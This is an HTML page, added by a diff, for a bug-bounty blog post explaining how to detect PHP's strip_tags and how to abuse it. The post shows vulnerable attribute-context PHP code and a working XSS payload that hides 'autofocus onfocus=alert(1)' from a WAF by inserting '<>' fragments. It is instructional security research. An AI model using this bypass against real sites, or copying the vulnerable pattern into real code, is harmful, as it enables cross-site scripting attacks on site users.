@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="chrome=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer">
+
+<meta name="description" content="A tasteful blog about Computer Security and cars. I break stuff unintentionally so you don&#39;t have to.">
+
+<meta name="twitter:card" content="summary">
+<meta name="twitter:domain" content="https://tasteofsecurity.com/">
+
+<meta name="twitter:image" content="https://tasteofsecurity.com/tn.png">
+<meta name="twitter:title" property="og:title" itemprop="title name" content="A taste of security">
+<meta name="twitter:description" property="og:description" itemprop="description" content="A tasteful blog about Computer Security and cars. I break stuff unintentionally so you don&#39;t have to.">
+<meta name="og:type" content="website">
+<meta name="og:url" content="https://tasteofsecurity.com/">
+<meta name="og:image" itemprop="image primaryImageOfPage" content="https://tasteofsecurity.com/tn.png">
+
+<link rel="shortcut icon" href="https://tasteofsecurity.com/sam.ico" id="favicon">
+<link rel="stylesheet" href="https://tasteofsecurity.com/css/style.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Didact+Gothic">
+
+    
+
+    
+    
+    
+    <title>
+        
+        Abusing PHP strip tags to bypass modern WAF to exploit XSS
+        
+    </title>
+</head>
+
+<body>
+    <div class="wrap">
+        <div class="section" id="title">Abusing PHP strip tags to bypass modern WAF to exploit XSS</div>
+
+        
+<div class="section" id="content">
+    Fri Oct 04, 2019  &#183; 2 min read
+    
+    <div class="tag-container">
+        
+        <span class="tag">
+            <a href="https://tasteofsecurity.com/tags/web">
+                web
+            </a>
+        </span>
+        
+        <span class="tag">
+            <a href="https://tasteofsecurity.com/tags/php">
+                PHP
+            </a>
+        </span>
+        
+        <span class="tag">
+            <a href="https://tasteofsecurity.com/tags/bugbountytip">
+                bugbountytip
+            </a>
+        </span>
+        
+        <span class="tag">
+            <a href="https://tasteofsecurity.com/tags/waf">
+                WAF
+            </a>
+        </span>
+        
+        <span class="tag">
+            <a href="https://tasteofsecurity.com/tags/xss">
+                XSS
+            </a>
+        </span>
+        
+    </div>
+    
+    <hr/>
+    <p>Black box exploitation is always hard. PHP offers many options to help you prevent XSS attacks. Here are a few:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">    strip_tags(...)
+    htmlentities(...)
+    htmlspecialchars(...)
+    filter_input(...)
+    urlencode(...)
+</code></pre></div><p>It may be hard to distinguish which of these functions are used in the application you are testing. There might also be a combination of these used to prevent XSS attacks.</p>
+<h3 id="how-to-detect-strip_tags-through-black-box-testing">How to detect <code>strip_tags</code> through black box testing?</h3>
+<ol>
+<li>Everything between <code>&lt;</code> and <code>&gt;</code> is removed.</li>
+<li>A special case is when only the opening tag <code>&lt;</code> exist but <strong>not</strong> the closing <code>&gt;</code>. In this case, everything after the <code>&lt;</code> will be truncated.</li>
+</ol>
+<p><strong>Example of characteristics:</strong></p>
+<ol>
+<li><code>strip_tags(&quot;foo&lt;bar&gt;&quot;) =&gt; &quot;foobar&quot;</code></li>
+<li><code>strip_tags(&quot;foo&lt;bar.....&quot;) =&gt; &quot;foo&quot;</code></li>
+<li><code>strip_tags(&quot;foobar&gt;&quot;) =&gt; &quot;foobar&gt;&quot;</code></li>
+</ol>
+<h3 id="how-to-abuse-strip_tags">How to abuse strip_tags</h3>
+<p>Let&rsquo;s say you find a parameter that is vulnerable to XSS.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;input&#34;</span> <span style="color:#a6e22e">data-id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{XSS}&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;test&#34;</span> /&gt;
+</code></pre></div><p>You try a simple alert payload</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;input&#34;</span> <span style="color:#a6e22e">data-id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> <span style="color:#a6e22e">autofocus</span> <span style="color:#a6e22e">onfocus</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert(1)</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;test&#34;</span> /&gt;
+</code></pre></div><blockquote>
+<p>Result: Error 500: Blocked by WAF&hellip;</p>
+</blockquote>
+<p>Finding a WAF bypass can often be tiresome and require very creative payloads.</p>
+<p>Let´s say the PHP code looks something like this</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;input&#34;</span> <span style="color:#a6e22e">data-id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span><span style="color:#a6e22e">strip_tags</span>($_GET[<span style="color:#e6db74">&#39;id-test&#39;</span>]);<span style="color:#75715e">?&gt;</span><span style="color:#e6db74">&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;test&#34;</span> /&gt;
+</code></pre></div><p>Sometimes we can <em>abuse</em> strip_tags if it&rsquo;s used in the wrong context, like in this case.</p>
+<p>Since we are in the attribute context, we do not need to open any tags (&lt;..&gt;) for our payload to work. Looking at our payload <code>&quot; autofocus onfocus=alert(1)</code> that was blocked by the WAF.</p>
+<p>What happens if we apply <code>&lt;&gt;</code> to our payload:</p>
+<pre><code>    /?id-test=&quot;&lt;&gt; au&lt;&gt;tof&lt;&gt;ocus o&lt;&gt;nfo&lt;&gt;cus=&lt;&gt;al&lt;&gt;ert&lt;&gt;(1&lt;&gt;)
+</code></pre><ol>
+<li>The WAF will allow this payload as it&rsquo;s just gibberish.</li>
+<li>PHP see our payload and apply <code>strip_tags</code> to our string and remove all <code>&lt;&gt;</code>.</li>
+<li>Our payload will trigger the XSS:</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;input&#34;</span> <span style="color:#a6e22e">data-id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> <span style="color:#a6e22e">autofocus</span> <span style="color:#a6e22e">onfocus</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert(1)</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;test&#34;</span> /&gt;
+</code></pre></div><h3 id="summary">Summary</h3>
+<p>If <code>strip_tags</code> is used in the wrong web context, we can abuse this by adding <code>&lt;&gt;</code> to our payload which will trick the WAF into thinking this payload is allowed. When PHP later processes our payload it will remove all the <code>&lt;&gt;</code> and thus revealing our battle-ready XSS payload.</p>
+
+</div>
+
+
+        
+<div class="section bottom-menu">
+    
+<hr />
+<p>
+
+
+    
+        <a href="/security">back</a>
+        
+            &#183;
+        
+    
+    <a href="https://tasteofsecurity.com/">
+        #root
+    </a>
+    &#183; 
+    
+        
+            <a href="/security/">
+                A taste of security
+            </a>
+        
+    
+    
+        
+            &#183; 
+            <a href="/how-to/">
+                Break it, fix it.
+            </a>
+        
+            &#183; 
+            <a href="/about">
+                I&#39;m Hugo
+            </a>
+        
+    
+
+</p>
+
+</div>
+
+
+        <div class="section footer">© 2023 Hugo</div>
+    </div>
+</body>
+
+</html>
